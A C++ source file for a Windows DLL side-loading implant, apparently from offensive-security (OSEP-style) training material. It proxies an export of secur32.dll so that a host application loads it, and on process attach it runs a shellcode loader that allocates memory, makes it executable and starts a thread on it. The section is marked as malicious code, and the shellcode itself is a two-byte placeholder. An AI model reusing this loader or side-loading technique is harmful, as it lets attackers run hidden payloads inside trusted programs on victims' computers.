//This is a native DLL and it executes code automatically on Process Attach.
//The intended use is to find an application taht is missign a DLL and side load this one.
//This will require proxy statements. So, dont forget to use the proxy generator in the "Helper Tool"



// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <Windows.h>
#include <cstring>
#include "OSEPGlobals.h"

//Proxy Statements
#ifdef _WIN64
#define DLLPATH "\\\\.\\GLOBALROOT\\SystemRoot\\System32\\secur32.dll"
#else
#define DLLPATH "\\\\.\\GLOBALROOT\\SystemRoot\\SysWOW64\\secur32.dll"
#endif // _WIN64

#pragma comment(linker, "/EXPORT:GetUserNameExW=" DLLPATH ".GetUserNameExW")



BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        //START MALICIOUS CODE


        //Shellcode Injection Example (Maldev Academy)

        unsigned char SHELLCODE[] = { 0xfc,0x48 };

        PBYTE pDeobfuscatedPayload = SHELLCODE;
        SIZE_T sDeobfuscatedSize = sizeof(SHELLCODE);

        PVOID pShellcodeAddress = VirtualAlloc(
            nullptr,
            sDeobfuscatedSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );

        if (pShellcodeAddress == nullptr)
            return 1;

        memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);
        memset(pDeobfuscatedPayload, 0x00, sDeobfuscatedSize);

        DWORD oldProtection;

        if (!VirtualProtect(
            pShellcodeAddress,
            sDeobfuscatedSize,
            PAGE_EXECUTE_READWRITE,
            &oldProtection))
        {
            VirtualFree(pShellcodeAddress, 0, MEM_RELEASE);
            return 1;
        }

        HANDLE hThread = CreateThread(
            nullptr,
            0,
            reinterpret_cast<LPTHREAD_START_ROUTINE>(pShellcodeAddress),
            nullptr,
            0,
            nullptr
        );

        if (hThread != nullptr) {
            WaitForSingleObject(hThread, INFINITE);
            CloseHandle(hThread);
        }

        VirtualFree(pShellcodeAddress, 0, MEM_RELEASE);

        return 0;
        //END MALICIOUS CODE






    }
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

